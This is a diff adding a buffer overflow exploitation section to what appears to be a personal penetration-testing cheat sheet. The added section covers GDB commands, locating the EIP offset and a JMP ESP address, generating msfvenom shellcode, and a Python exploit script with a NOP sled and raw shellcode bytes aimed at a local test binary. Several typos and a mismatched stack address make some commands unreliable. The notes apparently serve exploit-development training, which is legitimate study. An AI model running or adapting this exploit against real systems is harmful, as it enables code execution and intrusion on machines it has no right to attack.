@@ -1447,5 +1447,91 @@ mail.err			/var/log/mail.err
 ```
 
 
+Exploitation Development
+Linux Exploitation Buffer Overflow
+GDB Uses
+
+disass <FUNCTION>   #   Disassemble portion of the program
+info <...>  #   Supply info for specific stack areas
+x/256c $<REGISTER>  #   Read characters from specific register
+break <address>  #   Establish a break point
+pdisass main  # breaks up the main function
+run function in gdb
+
+make pythin script to find the EIP point in the buffer
+
+#!/user/bin/env python
+ buffer = "A" * 62
+ eip = "BBBB"
+  
+ print(buffer+eip)
+gbd-peda$ run <<<$(python Linbuff.py)
+
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+
+env - gdb ./func    # gives a clean copy of the gdb 
+(gdb) show env
+LINES=27
+COLUMNS=101
+(gdb) unset env lines
+(gdb) unset env columns
+run functions and input manual overflow, get segmentation fault
+
+info proc map
+Find the first hex value right after the heap to the end of the stack to get the stack
+
+(gdb) find /b 0xfde1000, 0xffffe000, 0xff, 0xe4
+grab 4 addresses, flip them to little endian
+
+#!/user/bin/env python
+  
+  
+  #stack is in between 0xf7de1000 and 0xffffe000
+  
+  #0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
+  #0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
+  #0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
+  #0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"
+  
+  
+  buffer = "A" * 62
+  eip = "BBBB"
+  
+  
+  print(buffer+eip)
+  
+make a new window and create a msfvenom payload, if it doesnt work try to generate another one
+
+msfvenom -p /linux/x86/exec CMD=whoami -b '\x00' -f python
+copy shellcode into to python script then add nop varaible
+
+ #!/user/bin/env python
+   
+   
+  #stack is in between 0xf7de1000 and 0xffffe000
+  
+  #0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
+  #0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
+  #0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
+  #0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"
+  
+  
+  buffer = "A" * 62
+  eip = "\x59\x3b\xde\xf7"
+  
+  nop = "\x90" * 15
+  
+  buf =  b""
+  buf += b"\xd9\xf6\xd9\x74\x24\xf4\x5e\x33\xc9\xb1\x0a\xbd"
+  buf += b"\x25\x84\x0f\x24\x31\x6e\x19\x03\x6e\x19\x83\xc6"
+  buf += b"\x04\xc7\x71\x65\x2f\x5f\xe3\x28\x49\x37\x3e\xae"
+  buf += b"\x1c\x20\x28\x1f\x6c\xc6\xa9\x37\xbd\x74\xc3\xa9"
+  buf += b"\x48\x9b\x41\xde\x48\x5b\x66\x1e\x26\x3f\x66\x49"
+  buf += b"\xeb\x36\x87\xb8\x8b"
+  
+  print(buffer+eip+nop+buf)
+execute the script.
+
+./func <<<$(python linbuffer.py)
 
 
